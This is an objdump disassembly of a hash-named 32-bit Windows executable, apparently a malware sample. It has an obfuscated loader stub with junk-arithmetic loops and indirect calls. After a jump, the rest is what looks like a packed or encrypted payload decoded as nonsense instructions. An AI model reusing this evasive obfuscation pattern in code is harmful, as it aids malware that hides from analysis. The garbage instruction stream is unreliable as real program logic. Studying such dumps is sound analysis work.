
4399a82acf15bc1ee80a274cfd8b21b19194b180c82847be528494fe69652eb6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401070
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	jg     0x401070
  40103e:	jmp    0x40105e
  401043:	push   0x1
  401045:	push   0x4b7c
  40104a:	push   DWORD PTR [ebp-0x28]
  40104d:	push   DWORD PTR [ebp-0x1c]
  401050:	push   0x4108
  401055:	push   DWORD PTR [ebp-0xc]
  401058:	call   DWORD PTR ds:0x42a3c2
  40105e:	mov    ecx,DWORD PTR ds:0x42a266
  401064:	dec    ecx
  401065:	mov    DWORD PTR ds:0x42a266,ecx
  40106b:	jmp    0x401024
  401070:	push   edi
  401071:	mov    esi,0x75108aa
  401076:	sbb    DWORD PTR ds:0x42a266,0x4c4b
  401080:	xor    eax,esi
  401082:	and    DWORD PTR ds:0x42a26e,0x59cd
  40108c:	mov    edi,0x3272f1
  401091:	mov    ecx,DWORD PTR ds:0x42a26a
  401097:	sbb    ecx,DWORD PTR ds:0x42a2aa
  40109d:	mov    DWORD PTR ds:0x42a26a,ecx
  4010a3:	add    eax,edi
  4010a5:	and    DWORD PTR ds:0x42a296,0x0
  4010af:	jmp    0x4010c3
  4010b4:	xor    ecx,ecx
  4010b6:	xor    ecx,DWORD PTR ds:0x42a296
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42a296,ecx
  4010c3:	cmp    DWORD PTR ds:0x42a296,0x1e
  4010ca:	jae    0x401113
  4010d0:	cmp    DWORD PTR ds:0x42a296,0xe
  4010d7:	ja     0x401113
  4010dd:	jmp    0x4010f2
  4010e2:	push   0x42a25e
  4010e7:	push   0x42916d
  4010ec:	call   DWORD PTR ds:0x42a3ca
  4010f2:	cmp    DWORD PTR ds:0x42a296,0xd
  4010f9:	jne    0x40110e
  4010ff:	xor    ecx,ecx
  401101:	or     ecx,DWORD PTR ds:0x42a296
  401107:	inc    ecx
  401108:	mov    DWORD PTR ds:0x42a296,ecx
  40110e:	jmp    0x4010b4
  401113:	mov    DWORD PTR [ebp-0x40],eax
  401116:	mov    eax,ds:0x42a2ca
  40111b:	sbb    DWORD PTR ds:0x42a25a,eax
  401121:	mov    eax,ds:0x42929e
  401126:	sub    DWORD PTR ds:0x42a2fa,ecx
  40112c:	mov    eax,DWORD PTR [eax]
  40112e:	mov    DWORD PTR [ebp-0x3c],eax
  401131:	inc    eax
  401132:	mov    eax,ds:0x4294ae
  401137:	and    DWORD PTR ds:0x42a26a,0x0
  401141:	jmp    0x401153
  401146:	mov    ecx,DWORD PTR ds:0x42a26a
  40114c:	inc    ecx
  40114d:	mov    DWORD PTR ds:0x42a26a,ecx
  401153:	cmp    DWORD PTR ds:0x42a26a,0x1f
  40115a:	jae    0x40119f
  401160:	cmp    DWORD PTR ds:0x42a26a,0x4
  401167:	jge    0x40119f
  40116d:	jmp    0x401180
  401172:	push   DWORD PTR [ebp-0x18]
  401175:	push   0x42a2c6
  40117a:	call   DWORD PTR ds:0x42a3ce
  401180:	cmp    DWORD PTR ds:0x42a26a,0x3
  401187:	jne    0x40119a
  40118d:	mov    ecx,DWORD PTR ds:0x42a26a
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a26a,ecx
  40119a:	jmp    0x401146
  40119f:	mov    eax,DWORD PTR [eax]
  4011a1:	add    ecx,0x507d
  4011a7:	mov    DWORD PTR [ebp-0x1c],eax
  4011aa:	xor    ecx,0x7815
  4011b0:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  4011b7:	or     DWORD PTR ds:0x42a2da,0x4fa4
  4011c1:	mov    eax,DWORD PTR [ebp-0x34]
  4011c4:	xor    eax,esi
  4011c6:	sub    ecx,DWORD PTR ds:0x42a2ce
  4011cc:	add    eax,edi
  4011ce:	and    DWORD PTR ds:0x42a266,edi
  4011d4:	mov    DWORD PTR [ebp-0x40],eax
  4011d7:	mov    eax,ds:0x42941e
  4011dc:	mov    DWORD PTR [ebp-0x40],eax
  4011df:	xor    eax,0x2e62
  4011e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4011e7:	mov    DWORD PTR [ebp-0x14],eax
  4011ea:	and    DWORD PTR ds:0x42a2de,0x0
  4011f4:	xor    ecx,ecx
  4011f6:	xor    ecx,DWORD PTR ds:0x42a2de
  4011fc:	inc    ecx
  4011fd:	mov    DWORD PTR ds:0x42a2de,ecx
  401203:	cmp    DWORD PTR ds:0x42a2de,0xb
  40120a:	ja     0x401250
  401210:	jmp    0x401229
  401215:	push   DWORD PTR [ebp-0x14]
  401218:	push   0x42a25e
  40121d:	push   DWORD PTR [ebp-0x18]
  401220:	push   DWORD PTR [ebp-0x20]
  401223:	call   DWORD PTR ds:0x42a3d2
  401229:	cmp    DWORD PTR ds:0x42a2de,0xa
  401230:	jne    0x401243
  401236:	mov    ecx,DWORD PTR ds:0x42a2de
  40123c:	inc    ecx
  40123d:	mov    DWORD PTR ds:0x42a2de,ecx
  401243:	cmp    DWORD PTR ds:0x42a2de,0x12
  40124a:	jb     0x4011f4
  401250:	mov    eax,DWORD PTR [ebp-0x14]
  401253:	adc    DWORD PTR ds:0x42a2ee,edx
  401259:	push   0x4
  40125b:	pop    ecx
  40125c:	or     DWORD PTR ds:0x42a256,0x42a2ba
  401266:	sub    ecx,eax
  401268:	and    DWORD PTR ds:0x42a2ae,edx
  40126e:	add    ecx,DWORD PTR [ebp-0x1c]
  401271:	sub    DWORD PTR ds:0x42a25a,0x29a3
  40127b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401282:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  40128c:	mov    DWORD PTR [ebp-0x18],ecx
  40128f:	xor    eax,eax
  401291:	xor    eax,DWORD PTR ds:0x42a2c2
  401297:	or     DWORD PTR ds:0x42a276,eax
  40129d:	jmp    0x4035f6
  4012a2:	scas   eax,DWORD PTR es:[edi]
  4012a3:	cdq    
  4012a4:	and    DWORD PTR [ebx],edx
  4012a6:	add    DWORD PTR [ebx+0x10ba9981],ecx
  4012ac:	cwde   
  4012ad:	int    0x35
  4012af:	mov    bl,0x72
  4012b1:	xor    DWORD PTR [ebx+0x47838383],eax
  4012b7:	pop    esi
  4012b8:	add    DWORD PTR [ebx+0x38262d24],0x20
  4012bf:	xor    al,0x22
  4012c1:	cs je  0x401301
  4012c4:	jo     0x40133d
  4012c6:	into   
  4012c7:	ja     0x40133c
  4012c9:	jae    0x401337
  4012cb:	dec    ebx
  4012cc:	aam    0xdd
  4012ce:	clc    
  4012cf:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	pusha  
  4012d8:	into   
  4012d9:	pop    esp
  4012da:	push   ebx
  4012db:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012e1:	dec    esp
  4012e2:	jle    0x40132a
  4012e4:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012ea:	sub    eax,0x3dd77fe
  4012ef:	push   0x7e
  4012f1:	pop    ds
  4012f2:	in     al,dx
  4012f3:	inc    eax
  4012f4:	int3   
  4012f5:	ret    
  4012f6:	in     al,dx
  4012f7:	xchg   esi,eax
  4012f8:	sub    bl,bh
  4012fa:	xchg   edx,eax
  4012fb:	xor    BYTE PTR [esi],cl
  4012fd:	pusha  
  4012fe:	mov    dl,0x93
  401300:	aad    0x6
  401302:	ins    BYTE PTR es:[edi],dx
  401303:	fcom   QWORD PTR ds:0x37030fe5
  401309:	and    DWORD PTR [ecx+0xd],edx
  40130c:	aaa    
  40130d:	jb     0x401380
  40130f:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  401316:	lock push eax
  401318:	xor    al,BYTE PTR [ebp+0x62d14b]
  40131e:	and    eax,DWORD PTR [ebx]
  401320:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  40132a:	fwait
  40132b:	dec    eax
  40132c:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401332:	jecxz  0x401360
  401334:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40133c:	xor    BYTE PTR [eax-0x6e323937],dl
  401342:	push   0x4d6b54f5
  401347:	or     eax,0x1a470a3f
  40134c:	lods   al,BYTE PTR ds:[esi]
  40134d:	push   edx
  40134e:	shl    DWORD PTR [esi+0x6715d949],cl
  401354:	cld    
  401355:	imul   esp,DWORD PTR [edi-0x4c],0x0
  401359:	jno    0x401319
  40135b:	add    DWORD PTR [ebx+0x19],ebx
  40135e:	mov    ds:0x3a8ea67c,eax
  401363:	in     al,dx
  401364:	pop    edx
  401365:	rol    ah,cl
  401367:	xchg   edi,eax
  401368:	mov    al,0x59
  40136a:	les    ebx,FWORD PTR [esi+ecx*2+0x29]
  40136e:	mov    ebx,ebp
  401370:	add    BYTE PTR [esi],dl
  401372:	cdq    
  401373:	mov    ecx,0xe65fd1b4
  401378:	xor    al,0x20
  40137a:	call   0x7afc:0x30f68aae
  401381:	mov    bh,0x67
  401383:	(bad)  
  401384:	push   edx
  401385:	xchg   esi,eax
  401386:	iret   
  401387:	xchg   ecx,eax
  401388:	mov    ah,0xe6
  40138a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40138b:	cld    
  40138c:	and    eax,0x9400efae
  401391:	cmp    DWORD PTR [esi-0x1c14d6f3],esi
  401397:	shl    DWORD PTR [ebx-0x60],1
  40139a:	adc    eax,0x7f84ebc7
  40139f:	dec    ebp
  4013a0:	shl    BYTE PTR [ebx+0x41],1
  4013a3:	mov    esi,0xdd815919
  4013a8:	test   al,0x97
  4013aa:	es or  eax,0x743c2921
  4013b0:	mov    ecx,ecx
  4013b2:	dec    ebx
  4013b3:	or     ebp,DWORD PTR [esi-0x430b24df]
  4013b9:	jge    0x4013d1
  4013bb:	call   0x8a64f527
  4013c0:	sbb    al,0x76
  4013c2:	test   esp,eax
  4013c4:	mov    cl,0xa4
  4013c6:	push   ds
  4013c7:	rcl    DWORD PTR [esp+edi*2],1
  4013ca:	adc    BYTE PTR [esi+0x50],bh
  4013cd:	lock push edx
  4013cf:	cs push ebp
  4013d1:	and    ah,ah
  4013d3:	push   ds
  4013d4:	cmp    eax,0xd061e81d
  4013d9:	int3   
  4013da:	cmp    eax,esp
  4013dc:	jno    0x401422
  4013de:	lahf   
  4013df:	stos   DWORD PTR es:[edi],eax
  4013e0:	adc    esi,edx
  4013e2:	sbb    eax,0x6dd5fa84
  4013e7:	lock push ds
  4013e9:	add    ebx,DWORD PTR [ecx]
  4013eb:	or     esi,eax
  4013ed:	popa   
  4013ee:	sbb    edi,esp
  4013f0:	mov    dl,0xfb
  4013f2:	pusha  
  4013f3:	cmp    ah,BYTE PTR [esi-0xe]
  4013f6:	in     eax,0x23
  4013f8:	pop    ds
  4013f9:	aam    0x9e
  4013fb:	pop    edx
  4013fc:	xchg   edx,eax
  4013fd:	enter  0x5742,0x54
  401401:	push   ss
  401402:	mov    DWORD PTR [eax+0x2],esp
  401405:	mov    ch,0x92
  401407:	pop    ecx
  401408:	inc    ebp
  401409:	cmc    
  40140a:	aad    0x22
  40140c:	and    DWORD PTR [eax-0x39],esi
  40140f:	xor    DWORD PTR [eax-0x4dba0b6],0x36bc27ce
  401419:	cmp    eax,0xa4b46697
  40141e:	jo     0x401462
  401420:	inc    eax
  401421:	xchg   esp,eax
  401422:	enter  0x2315,0xc3
  401426:	daa    
  401427:	out    dx,al
  401428:	sub    eax,0xaa09b5e3
  40142d:	push   eax
  40142e:	push   ds
  40142f:	sbb    bl,BYTE PTR [eax-0x7209410]
  401435:	cli    
  401436:	add    ebp,DWORD PTR [esi+0x27d5311d]
  40143c:	adc    BYTE PTR [edi+ecx*2+0x28],bl
  401440:	test   DWORD PTR [ebx-0x3f],0x7e7d5c08
  401447:	push   edx
  401448:	adc    eax,0x2802d557
  40144d:	and    edx,eax
  40144f:	mov    ecx,0x6eb0c36
  401454:	inc    esi
  401455:	mov    ah,0xee
  401457:	mov    ebx,0x63d82227
  40145c:	inc    esi
  40145d:	xor    esp,DWORD PTR [edi-0x6fb6ff5b]
  401463:	clc    
  401464:	int    0x10
  401466:	xchg   edx,eax
  401467:	outs   dx,BYTE PTR ds:[esi]
  401468:	mov    ds:0x99230b5d,eax
  40146d:	mov    edx,0x3eda5f65
  401472:	sub    ebx,esp
  401474:	out    dx,al
  401475:	push   ds
  401476:	std    
  401477:	adc    esp,DWORD PTR [ecx+0x7f]
  40147a:	mov    al,0xe2
  40147c:	ret    0xc9a7
  40147f:	clc    
  401480:	call   0xde2c0e95
  401485:	jg     0x4014e7
  401487:	mov    eax,ds:0xda1148c9
  40148c:	pop    eax
  40148d:	inc    ebp
  40148e:	test   eax,0x496ee765
  401493:	and    DWORD PTR [edx-0x3b],0x65c3e7e6
  40149a:	cld    
  40149b:	je     0x40147b
  40149d:	or     DWORD PTR [edi-0x4ee151de],esp
  4014a3:	stos   DWORD PTR es:[edi],eax
  4014a4:	mov    ebp,0xd872df8c
  4014a9:	xchg   edx,eax
  4014aa:	ss fwait
  4014ac:	ret    
  4014ad:	mov    dh,0xc9
  4014af:	mov    eax,0x8dab8f2d
  4014b4:	mov    DWORD PTR [edi-0x3d],ecx
  4014b7:	jno    0x4014fa
  4014b9:	mov    ds:0xc0ea4a74,al
  4014be:	jno    0x4014a4
  4014c0:	inc    eax
  4014c1:	mov    bl,0x29
  4014c3:	out    dx,eax
  4014c4:	scas   al,BYTE PTR es:[edi]
  4014c5:	dec    edi
  4014c6:	stos   DWORD PTR es:[edi],eax
  4014c7:	jae    0x4014d7
  4014c9:	mov    ah,0x8b
  4014cb:	mov    BYTE PTR [esi],dh
  4014cd:	pushf  
  4014ce:	inc    ecx
  4014cf:	mov    edx,0x3281c50a
  4014d4:	sbb    al,0x30
  4014d6:	int3   
  4014d7:	push   es
  4014d8:	push   0xae54f1e1
  4014dd:	fld    QWORD PTR [edx]
  4014df:	dec    edx
  4014e0:	lea    edi,[edx-0x406e8e54]
  4014e6:	sub    BYTE PTR [ecx+0x54e09152],al
  4014ec:	xor    ecx,DWORD PTR [ebx+esi*2+0x6d]
  4014f0:	daa    
  4014f1:	ds jecxz 0x401523
  4014f4:	mov    cl,0xd5
  4014f6:	(bad)  
  4014f7:	sub    eax,0x2c728202
  4014fc:	sub    ebx,ebp
  4014fe:	push   ss
  4014ff:	jmp    0x433e764e
  401504:	mov    esi,DWORD PTR ds:0xa60bf5f9
  40150a:	jmp    0x189d:0x4fdb860d
  401511:	jne    0x40150d
  401513:	push   esi
  401514:	and    DWORD PTR [ecx],0xf2567dcc
  40151a:	mov    gs,eax
  40151c:	xor    BYTE PTR [edi+0x17dc0679],ah
  401522:	ja     0x401552
  401524:	aam    0x43
  401526:	out    0x74,eax
  401528:	mov    ah,0x8c
  40152a:	pop    edx
  40152b:	shl    DWORD PTR [esi+0x40ba14fd],cl
  401531:	cld    
  401532:	sbb    al,0x9
  401534:	(bad)  
  401536:	mov    edi,0xbf4e9647
  40153b:	andps  xmm2,XMMWORD PTR [eax-0x7350366]
  401542:	ds pop es
  401544:	gs mov cl,0x5
  401547:	jno    0x401594
  401549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40154a:	pusha  
  40154b:	inc    ebx
  40154c:	mov    eax,ds:0xa8f1f041
  401551:	dec    BYTE PTR [edx]
  401553:	out    dx,eax
  401554:	push   ecx
  401555:	jno    0x4015b4
  401557:	ror    DWORD PTR [ebx+0x210f8653],cl
  40155d:	je     0x401538
  40155f:	lds    esi,FWORD PTR [ebx+edi*2]
  401562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401563:	leave  
  401564:	pushf  
  401565:	cwde   
  401566:	addr16 or esp,ebp
  401569:	sbb    eax,0x5bfcbe4f
  40156e:	adc    ebp,0x24395e7
  401574:	push   edx
  401575:	mov    eax,ds:0x81bf0856
  40157a:	mov    ecx,0xd1685014
  40157f:	or     ch,ah
  401581:	add    eax,0xff78fd28
  401586:	push   ecx
  401587:	mov    ah,0x96
  401589:	pop    esi
  40158a:	int    0xf8
  40158c:	in     eax,dx
  40158d:	fsub   DWORD PTR [esi+0x5c]
  401590:	dec    ebp
  401591:	ss or  eax,0x2a4139bf
  401597:	mov    al,0x18
  401599:	scas   al,BYTE PTR es:[edi]
  40159a:	xchg   ebp,eax
  40159b:	push   eax
  40159c:	mov    esi,DWORD PTR [edx]
  40159e:	daa    
  40159f:	inc    edx
  4015a0:	fstp   TBYTE PTR [ebx+0x52088bcb]
  4015a6:	jecxz  0x4015ca
  4015a8:	mov    dh,0xe7
  4015aa:	sub    eax,0xdb746681
  4015af:	imul   eax,ebx,0x77306eac
  4015b5:	inc    edx
  4015b6:	in     al,0xde
  4015b8:	mov    bl,0xdd
  4015ba:	xchg   ebx,eax
  4015bb:	scas   eax,DWORD PTR es:[edi]
  4015bc:	xchg   edi,eax
  4015bd:	fsub   QWORD PTR [eax+edi*8-0x78]
  4015c1:	xchg   ecx,eax
  4015c2:	aas    
  4015c3:	or     esp,DWORD PTR [ebx-0x37]
  4015c6:	or     DWORD PTR [eax-0x3d37ca7e],0x3adec87
  4015d0:	imul   eax,DWORD PTR [ecx],0xffffffbf
  4015d3:	retf   0xac72
  4015d6:	jb     0x4015af
  4015d8:	push   ss
  4015d9:	pushf  
  4015da:	jle    0x4015bf
  4015dc:	inc    edi
  4015dd:	shl    DWORD PTR [ebx+0x457aab07],cl
  4015e3:	push   es
  4015e4:	pop    ds
  4015e5:	sub    BYTE PTR [ebp+ecx*4+0x5c],dl
  4015e9:	push   ebp
  4015ea:	or     al,0x92
  4015ec:	addr16 pop ebx
  4015ee:	inc    edx
  4015ef:	loopne 0x40159d
  4015f1:	test   BYTE PTR [edi+0x51],bl
  4015f4:	mov    eax,0x3321f5e3
  4015f9:	push   ebp
  4015fa:	push   ebx
  4015fb:	mov    dh,0x5b
  4015fd:	xor    al,0x24
  4015ff:	xchg   edi,eax
  401600:	pop    eax
  401601:	je     0x401682
  401603:	scas   al,BYTE PTR es:[edi]
  401604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401605:	fwait
  401606:	jns    0x40160d
  401608:	xor    al,0xb
  40160a:	sbb    eax,ebx
  40160c:	sub    eax,0x56f30b44
  401611:	inc    edi
  401612:	jmp    0xb88a:0x972f51b2
  401619:	cmp    al,0x1e
  40161b:	mov    al,ds:0xe84dee96
  401620:	jecxz  0x401673
  401622:	stos   BYTE PTR es:[edi],al
  401623:	sub    BYTE PTR [ebx+0x6e],cl
  401626:	inc    esp
  401627:	out    0xe0,al
  401629:	mov    edx,0x3c719802
  40162e:	mov    ecx,0x353bf806
  401633:	cmp    al,0x68
  401635:	mov    edx,0xbe28242d
  40163a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40163b:	jg     0x401669
  40163d:	jns    0x40167a
  40163f:	xor    DWORD PTR [ebp-0x55],esi
  401642:	mov    cl,0xc3
  401644:	jmp    0x401634
  401646:	ja     0x40165f
  401648:	outs   dx,BYTE PTR ds:[esi]
  401649:	cmp    DWORD PTR [ecx-0x9],esp
  40164c:	or     bh,BYTE PTR [edx-0x20]
  40164f:	cs jg  0x401607
  401652:	dec    ebx
  401653:	xchg   ecx,eax
  401654:	jg     0x40161d
  401656:	add    dh,BYTE PTR fs:[eax-0x4ba7bbb5]
  40165d:	jg     0x401678
  40165f:	ins    DWORD PTR es:[edi],dx
  401660:	and    bh,BYTE PTR [edx-0x68]
  401663:	mov    esp,0xd2febb73
  401668:	push   edi
  401669:	loopne 0x40162f
  40166b:	aad    0x4c
  40166d:	cld    
  40166e:	adc    BYTE PTR [ebx+0x3b],dh
  401671:	dec    ebp
  401672:	popf   
  401673:	and    BYTE PTR [ebx],ch
  401675:	es dec esi
  401677:	sub    eax,0x4e38bc6f
  40167c:	sbb    ch,cl
  40167e:	mov    eax,ds:0xcd22b460
  401683:	pop    ebp
  401684:	outs   dx,BYTE PTR ds:[esi]
  401685:	mov    al,ds:0xbb63ba07
  40168a:	add    DWORD PTR [edi-0x21],0xca4cdf14
  401691:	mov    dh,0x44
  401693:	lock mov ah,0x6
  401696:	stos   DWORD PTR es:[edi],eax
  401697:	adc    BYTE PTR ds:[esp+edx*1],dh
  40169b:	shl    DWORD PTR ds:0x4a358bb5,0xae
  4016a2:	hlt    
  4016a3:	inc    ecx
  4016a4:	xlat   BYTE PTR ds:[ebx]
  4016a5:	sbb    al,0x4
  4016a7:	mov    ds:0xd791cb35,eax
  4016ac:	mov    eax,ds:0xe95bddd3
  4016b1:	xor    ecx,0x20
  4016b4:	enter  0x1239,0x44
  4016b8:	jl     0x4016e2
  4016ba:	mov    dl,0xc7
  4016bc:	test   edi,ecx
  4016be:	mov    ch,0x88
  4016c0:	jmp    FWORD PTR [esi+0x5eec683e]
  4016c6:	add    al,cl
  4016c8:	daa    
  4016c9:	xchg   edx,eax
  4016ca:	pushf  
  4016cb:	hlt    
  4016cc:	out    0x13,eax
  4016ce:	lahf   
  4016cf:	inc    ebp
  4016d0:	call   0x5b21:0xe25668ea
  4016d7:	(bad)  
  4016d8:	cli    
  4016d9:	popa   
  4016da:	inc    esp
  4016db:	pop    es
  4016dc:	dec    edx
  4016dd:	fidiv  WORD PTR [ecx-0x10]
  4016e0:	push   cs
  4016e1:	and    BYTE PTR es:[esi],ch
  4016e4:	add    ecx,0x3f
  4016e7:	(bad)  
  4016e8:	cmp    eax,DWORD PTR [ecx]
  4016ea:	outs   dx,DWORD PTR ds:[esi]
  4016eb:	dec    ebx
  4016ec:	int    0xe0
  4016ee:	adc    dh,dh
  4016f0:	rcr    DWORD PTR [ebp+0x3ca33bb2],0x4e
  4016f7:	bndldx (bad),[bx+di-0x6ba4]
  4016fd:	jmp    0x4016a4
  4016ff:	(bad)
  401702:	out    dx,eax
  401703:	pop    es
  401704:	inc    eax
  401705:	outs   dx,BYTE PTR ds:[esi]
  401706:	or     BYTE PTR ds:[ecx-0x36],cl
  40170a:	js     0x401708
  40170c:	sbb    BYTE PTR [ebx],bh
  40170e:	mov    dl,0xa4
  401710:	call   0x678b:0xbdd124d4
  401717:	mov    dh,0x43
  401719:	mov    cl,0xc1
  40171b:	ret    
  40171c:	or     bh,BYTE PTR [ebx+edx*4+0x14]
  401720:	and    BYTE PTR [eax],bl
  401722:	int    0xe3
  401724:	int3   
  401725:	lock xchg edx,eax
  401727:	inc    ecx
  401728:	xor    DWORD PTR [esi],ebx
  40172a:	cdq    
  40172b:	jmp    0xf0719dcb
  401730:	iret   
  401731:	adc    DWORD PTR [ecx-0x6029380c],ebx
  401737:	inc    ebx
  401738:	and    eax,DWORD PTR [esi-0xd1ef0b7]
  40173e:	push   0xffffff8f
  401740:	call   0xd323:0x7d624940
  401747:	(bad)  
  401748:	jmp    0x9277:0xe361aaa8
  40174f:	push   ds
  401750:	arpl   WORD PTR [eax],sp
  401752:	push   esp
  401753:	dec    esp
  401754:	jl     0x4017b4
  401756:	dec    ebp
  401757:	std    
  401758:	inc    edx
  401759:	and    eax,0x2945b1d
  40175e:	lahf   
  40175f:	mov    bh,0x6b
  401761:	dec    edi
  401762:	or     eax,0xd3fa9b1d
  401767:	add    al,al
  401769:	mov    esp,DWORD PTR [edi]
  40176b:	or     al,0xf8
  40176d:	jmp    0xabea0182
  401772:	(bad)  
  401773:	std    
  401774:	ins    DWORD PTR es:[edi],dx
  401775:	shl    BYTE PTR [esi-0x368b29c5],cl
  40177b:	stc    
  40177c:	lds    edi,FWORD PTR gs:[edi]
  40177f:	lahf   
  401780:	jg     0x4017a6
  401782:	stc    
  401783:	sbb    cl,BYTE PTR [ecx]
  401785:	pop    ecx
  401786:	std    
  401787:	add    ecx,edx
  401789:	add    dh,BYTE PTR [ecx-0x53]
  40178c:	push   edi
  40178d:	scas   al,BYTE PTR es:[edi]
  40178e:	gs pop ds
  401790:	aas    
  401791:	pushw  cs
  401793:	je     0x4017bf
  401795:	ret    
  401796:	cmp    dl,BYTE PTR [eax+0x2aa7c23e]
  40179c:	mov    al,BYTE PTR [ebp-0x775dd1d]
  4017a2:	data16 fild QWORD PTR [edx-0x10bca7ef]
  4017a9:	push   cs
  4017aa:	enter  0xee3,0x37
  4017ae:	sti    
  4017af:	push   ecx
  4017b0:	and    BYTE PTR [eax+0x2],al
  4017b3:	out    0xde,eax
  4017b5:	inc    edi
  4017b6:	jmp    0x401740
  4017b8:	sbb    DWORD PTR [edi-0x4e],0xffffffeb
  4017bc:	mov    bh,0xb1
  4017be:	or     DWORD PTR [ecx],0x517cf561
  4017c4:	out    dx,al
  4017c5:	fwait
  4017c6:	idiv   BYTE PTR [esi+0x6d0255e6]
  4017cc:	stos   DWORD PTR es:[edi],eax
  4017cd:	add    BYTE PTR [ebx],0x41
  4017d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017d1:	fisub  DWORD PTR [edi-0x41]
  4017d4:	jg     0x401815
  4017d6:	jb     0x401808
  4017d8:	pop    esi
  4017d9:	loopne 0x40175b
  4017db:	mov    bl,0xa7
  4017dd:	push   0x7f1f5eeb
  4017e2:	xchg   DWORD PTR [ebx+ebx*1],esp
  4017e5:	sbb    bh,BYTE PTR [ecx+0x77]
  4017e8:	fs jg  0x401829
  4017eb:	add    cl,BYTE PTR [ecx]
  4017ed:	sub    DWORD PTR [edx-0x79e296de],edx
  4017f3:	aas    
  4017f4:	add    BYTE PTR [edi-0x4f],0x90
  4017f8:	repz shr BYTE PTR [esi+eiz*4],0x7c
  4017fd:	fld    QWORD PTR [eax+0xc]
  401800:	fimul  WORD PTR [edi+ebx*8-0x22]
  401804:	xchg   edi,eax
  401805:	sub    edx,edi
  401807:	cmc    
  401808:	dec    edi
  401809:	fldenv [edx+0xf031803]
  40180f:	push   ss
  401810:	retf   
  401811:	push   esp
  401812:	(bad)  
  401813:	sbb    edx,eax
  401815:	jp     0x401808
  401817:	adc    bh,BYTE PTR [edi+0x5e1f8091]
  40181d:	and    eax,0xb3037d87
  401822:	test   BYTE PTR [ecx+0x677a718c],al
  401828:	dec    esi
  401829:	std    
  40182a:	xchg   esp,eax
  40182b:	(bad)  
  40182c:	arpl   WORD PTR [ebp+0x477905dc],sp
  401832:	mov    al,ds:0xd6e6866c
  401837:	xchg   edx,eax
  401838:	inc    ecx
  401839:	jb     0x4018ae
  40183b:	mov    ebx,0xad88edd4
  401840:	jecxz  0x401884
  401842:	(bad)  
  401843:	cli    
  401844:	and    BYTE PTR [esi],0xa1
  401847:	call   0xd02e:0x5c1581d7
  40184e:	adc    al,0x50
  401850:	jo     0x4017d3
  401852:	daa    
  401853:	xchg   ecx,eax
  401854:	imul   esp,DWORD PTR [eax-0x71],0x30
  401858:	xor    ecx,DWORD PTR [edx+eax*8]
  40185b:	jbe    0x401843
  40185d:	dec    ecx
  40185e:	push   es
  40185f:	add    DWORD PTR [edi-0x6f],0x5b5fc217
  401866:	call   FWORD PTR [ebp+0x3a]
  401869:	add    DWORD PTR [ecx+edi*1+0x22caac7c],esp
  401870:	jne    0x4018b1
  401872:	ret    0xe97c
  401875:	jae    0x4018a2
  401877:	scas   eax,DWORD PTR es:[edi]
  401878:	mov    al,0x1d
  40187a:	pushf  
  40187b:	int    0x8a
  40187d:	cmp    al,0x78
  40187f:	shl    DWORD PTR [ebx+ecx*4-0x1abee506],cl
  401886:	adc    BYTE PTR [eax+edi*2+0x59e4e83e],ah
  40188d:	inc    ebp
  40188e:	push   ss
  40188f:	pop    eax
  401890:	std    
  401891:	push   0x701d9c4e
  401896:	out    0x81,al
  401898:	mov    edx,0xcd47969f
  40189d:	ins    BYTE PTR es:[edi],dx
  40189e:	fstp   QWORD PTR [esi]
  4018a0:	inc    ebx
  4018a1:	xlat   BYTE PTR ds:[ebx]
  4018a2:	inc    ebx
  4018a3:	mov    ebp,0x4f2e3747
  4018a8:	add    BYTE PTR [ebp+0x4f8a9030],bl
  4018ae:	mov    bl,0xe6
  4018b0:	mov    al,ds:0xb77d94eb
  4018b5:	jns    0x4018c2
  4018b7:	hlt    
  4018b8:	out    0x3e,eax
  4018ba:	cwde   
  4018bb:	retf   
  4018bc:	mov    ebx,0xa6bb3a0e
  4018c1:	and    eax,0xe6711c4b
  4018c6:	pop    edi
  4018c7:	cdq    
  4018c8:	or     BYTE PTR [eax-0x11],bl
  4018cb:	jecxz  0x401908
  4018cd:	sbb    cl,BYTE PTR [edx+0x66]
  4018d0:	jmp    0xbd50:0x6145b36c
  4018d7:	pushf  
  4018d8:	mov    cs,WORD PTR [edx]
  4018da:	les    esp,FWORD PTR [edx-0x73fe9fb0]
  4018e0:	xor    DWORD PTR [ecx-0x2ec566e4],ebp
  4018e6:	xor    ecx,ebx
  4018e8:	rol    DWORD PTR [ebx],cl
  4018ea:	repz int3 
  4018ec:	dec    ecx
  4018ed:	xchg   BYTE PTR [ebx],ch
  4018ef:	mov    al,ds:0xcbd59fe2
  4018f4:	sbb    edx,DWORD PTR [ecx+0x8]
  4018f7:	cmp    ebp,DWORD PTR [esi-0x3d]
  4018fa:	into   
  4018fb:	and    eax,0x58684cf8
  401900:	or     DWORD PTR [ebx+0x74],edi
  401903:	push   ds
  401904:	lea    edx,[eax+0x7496b74f]
  40190a:	rol    DWORD PTR ds:0x131a8869,1
  401910:	xchg   esp,eax
  401911:	jno    0x40191d
